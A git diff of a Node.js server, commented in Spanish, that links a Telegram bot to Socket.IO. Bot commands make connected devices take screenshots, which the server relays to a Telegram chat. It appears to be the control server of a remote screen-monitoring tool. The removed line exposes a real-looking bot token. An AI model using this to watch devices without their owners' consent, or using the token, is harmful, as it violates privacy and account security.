@@ -3,11 +3,14 @@ const express = require('express');
 const { createServer } = require('http');
 const { Server } = require('socket.io');
 
-const bot = new Telegraf('8185582538:AAGFy_Fy2JCjA_YVnYwjujuJMh0GSgKxHIw');
+const bot = new Telegraf(process.env.BOT_TOKEN);
 const app = express();
 const server = createServer(app);
 
-// Configure Socket.IO with CORS and ping timeout
+// Mapa mejorado para dispositivos conectados
+const connectedDevices = new Map();
+let lastActivityTime = new Map();
+
 const io = new Server(server, {
     cors: {
         origin: "*",
@@ -17,146 +20,125 @@ const io = new Server(server, {
     pingInterval: 25000
 });
 
-let connectedDevice = null;
-let lastActivityTime = null;
-let lastRequestedChatId = null;
-
-// Add basic health check endpoint
-app.get('/health', (req, res) => {
-    res.json({
-        status: 'ok',
-        deviceConnected: !!connectedDevice,
-        lastActivity: lastActivityTime
-    });
-});
-
 app.get('/', (req, res) => {
-    res.send('Servidor funcionando');
+    res.send('Monitor Server Running');
 });
 
-// Enhanced bot commands
+// Comandos del bot mejorados
 bot.command('start', (ctx) => {
     ctx.reply(
-        '🎮 Monitor de Dispositivo Móvil\n\n' +
+        '🎮 Monitor Remoto\n\n' +
         'Comandos disponibles:\n' +
-        '/screen - Toma una captura de pantalla\n' +
-        '/estado - Muestra el estado de conexión\n' +
-        '/ultimaActividad - Muestra cuando fue la última actividad\n' +
-        '/reconectar - Fuerza reconexión del dispositivo'
+        '/screen - Toma captura de pantalla\n' +
+        '/devices - Muestra dispositivos conectados\n' +
+        '/status - Estado del servidor'
     );
 });
 
-bot.command('screen', async (ctx) => {
-    if (!connectedDevice) {
-        return ctx.reply('❌ El dispositivo no está conectado');
-    }
-    
-    lastRequestedChatId = ctx.chat.id;
-    ctx.reply('📸 Solicitando captura de pantalla...');
-    
-    // Add timeout for screenshot request
-    const timeout = setTimeout(() => {
-        if (lastRequestedChatId === ctx.chat.id) {
-            ctx.reply('⚠️ Tiempo de espera agotado para la captura');
-            lastRequestedChatId = null;
-        }
-    }, 30000);
-    
-    io.emit('takeScreenshot');
-    console.log('Solicitud de captura enviada');
-});
-
-bot.command('reconectar', (ctx) => {
-    if (connectedDevice) {
-        connectedDevice.disconnect(true);
-        ctx.reply('🔄 Forzando reconexión del dispositivo...');
+bot.command('devices', (ctx) => {
+    const devices = Array.from(connectedDevices.keys());
+    if (devices.length === 0) {
+        ctx.reply('❌ No hay dispositivos conectados');
     } else {
-        ctx.reply('❌ No hay dispositivo conectado para reconectar');
+        const deviceList = devices.map((id, index) => {
+            const lastActivity = lastActivityTime.get(id);
+            const timeAgo = lastActivity ? Math.floor((Date.now() - lastActivity) / 1000 / 60) : 'N/A';
+            return `${index + 1}. Dispositivo ${id.slice(0, 6)} - Última actividad: hace ${timeAgo} minutos`;
+        }).join('\n');
+        ctx.reply(`📱 Dispositivos conectados:\n${deviceList}`);
     }
 });
 
-// Enhanced Socket.IO connection handling
+bot.command('status', (ctx) => {
+    const deviceCount = connectedDevices.size;
+    const status = deviceCount > 0 ? '🟢 Activo' : '🔴 Sin dispositivos';
+    ctx.reply(`Estado del servidor: ${status}\nDispositivos conectados: ${deviceCount}`);
+});
+
+bot.command('screen', async (ctx) => {
+    console.log('📸 Comando screen recibido');
+    console.log('Dispositivos conectados:', connectedDevices.size);
+    
+    if (connectedDevices.size === 0) {
+        return ctx.reply('❌ No hay dispositivos conectados');
+    }
+    
+    const devices = Array.from(connectedDevices.values());
+    const socket = devices[0]; // Tomamos el primer dispositivo
+    
+    try {
+        ctx.reply('📸 Solicitando captura de pantalla...');
+        socket.emit('takeScreenshot', { chatId: ctx.chat.id });
+        console.log('Solicitud de captura enviada al dispositivo');
+    } catch (error) {
+        console.error('Error al solicitar captura:', error);
+        ctx.reply('❌ Error al solicitar la captura');
+    }
+});
+
+// Manejo mejorado de conexiones Socket.IO
 io.on('connection', (socket) => {
-    console.log('🟢 Nueva conexión recibida');
+    console.log('🟢 Nueva conexión recibida:', socket.id);
     
-    socket.on('deviceConnected', (data) => {
-        console.log('🟢 Dispositivo identificado:', data);
-        connectedDevice = socket;
-        lastActivityTime = Date.now();
-        
-        // Notify all admin chats about connection
-        if (lastRequestedChatId) {
-            bot.telegram.sendMessage(lastRequestedChatId, '🟢 Dispositivo conectado');
-        }
+    // Registramos el dispositivo inmediatamente
+    connectedDevices.set(socket.id, socket);
+    lastActivityTime.set(socket.id, Date.now());
+    console.log('Dispositivos conectados:', connectedDevices.size);
+
+    socket.on('disconnect', () => {
+        console.log('🔴 Dispositivo desconectado:', socket.id);
+        connectedDevices.delete(socket.id);
+        lastActivityTime.delete(socket.id);
+        console.log('Dispositivos restantes:', connectedDevices.size);
     });
-    
-    socket.on('disconnect', (reason) => {
-        if (connectedDevice === socket) {
-            console.log('🔴 Dispositivo desconectado. Razón:', reason);
-            connectedDevice = null;
-            
-            // Notify all admin chats about disconnection
-            if (lastRequestedChatId) {
-                bot.telegram.sendMessage(lastRequestedChatId, 
-                    `🔴 Dispositivo desconectado\nRazón: ${reason}`);
-            }
-        }
-    });
-    
-    socket.on('screenshotTaken', async (base64Image) => {
+
+    socket.on('screenshotTaken', async (data) => {
         try {
-            if (!lastRequestedChatId) {
-                console.error('No hay ID de chat guardado');
-                return;
-            }
-            
-            console.log('📸 Recibida imagen, tamaño:', base64Image.length);
-            const imageBuffer = Buffer.from(base64Image, 'base64');
-            
-            await bot.telegram.sendPhoto(lastRequestedChatId, { 
+            console.log('📸 Recibida captura de pantalla');
+            const imageBuffer = Buffer.from(data.image, 'base64');
+            await bot.telegram.sendPhoto(data.chatId, { 
                 source: imageBuffer,
                 caption: '✅ Captura de pantalla'
             });
-            
-            console.log('✅ Captura enviada exitosamente');
-            lastRequestedChatId = null;
-            
+            console.log('✅ Captura enviada al chat');
         } catch (error) {
-            console.error('❌ Error al enviar screenshot:', error);
-            if (lastRequestedChatId) {
-                bot.telegram.sendMessage(lastRequestedChatId, 
-                    '❌ Error al enviar la captura: ' + error.message);
-            }
+            console.error('Error al enviar screenshot:', error);
+            bot.telegram.sendMessage(data.chatId, '❌ Error al enviar la captura: ' + error.message);
         }
     });
-    
+
     socket.on('activity', (data) => {
-        lastActivityTime = data.timestamp || Date.now();
-        console.log('💓 Actividad recibida del dispositivo:', new Date(lastActivityTime).toISOString());
+        lastActivityTime.set(socket.id, Date.now());
+        console.log('💓 Actividad recibida del dispositivo:', socket.id);
+    });
+
+    socket.on('error', (data) => {
+        console.error('❌ Error del cliente:', data.error);
+        if (data.chatId) {
+            bot.telegram.sendMessage(data.chatId, '❌ Error del dispositivo: ' + data.error);
+        }
     });
 });
 
-const PORT = process.env.PORT || 5000;
-server.listen(PORT, '0.0.0.0', () => {
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
     console.log(`🚀 Servidor iniciado en puerto ${PORT}`);
 });
 
 bot.launch().then(() => console.log('🤖 Bot de Telegram iniciado'));
 
-// Enhanced error handling
+// Manejo de errores y cierre limpio
 process.on('unhandledRejection', (error) => {
     console.error('Error no manejado:', error);
 });
 
-process.on('SIGINT', () => {
+process.once('SIGINT', () => {
     bot.stop('SIGINT');
     server.close();
-    process.exit(0);
 });
 
-process.on('SIGTERM', () => {
+process.once('SIGTERM', () => {
     bot.stop('SIGTERM');
     server.close();
-    process.exit(0);
 });
 
